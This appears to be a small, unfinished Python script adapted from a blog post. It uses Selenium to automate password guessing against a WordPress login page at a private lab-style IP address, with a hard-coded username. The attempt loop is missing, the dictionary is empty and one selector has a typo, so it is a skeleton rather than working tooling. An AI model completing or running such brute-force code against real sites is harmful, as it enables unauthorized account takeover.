"""Modified version of:
https://blog.rinatussenov.com/brute-forcing-enterprise-with-python-selenium-and-phantomjs-4cb26b08bf1a"""

from selenium import webdriver

from selenium.common.exceptions import NoSuchElementException


class BruteForcer:

    URL = "http://10.225.147.156/wp-login.php"
    # charList = "abcdefghijklmnopqrstuwxkyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    passwordDictionary = []
    username = "sigurda"
    password = "test"
    websiteDriver = None

    def __init__(self):
        self.websiteDriver = webdriver.Firefox()

    def test_formlogon(self):
        self.websiteDriver.get(self.URL)

        uname_input = self.websiteDriver.find_element_by_css_selector("input[type=text]")
        uname_input.send_keys(self.username)

        password_input = self.websiteDriver.find_element_by_css_selector("input[type=passsword]")
        password_input.send_keys(self.password)

        submitButton = self.websiteDriver.find_element_by_css_selector("input[type=submit]")
        submitButton.click()

        self.websiteDriver.save_screenshot("screenshots/screen.png")
        self.websiteDriver.get_screenshot_as_png()

    # Checks to see if the submit button is present or not, if it is not the password has been correctly input.
    def submitButtonIsPresent(self, selector):
        try:
            self.websiteDriver.find_element_by_css_selector(selector)
        except NoSuchElementException:
            return False
        return True


BruteForcer()
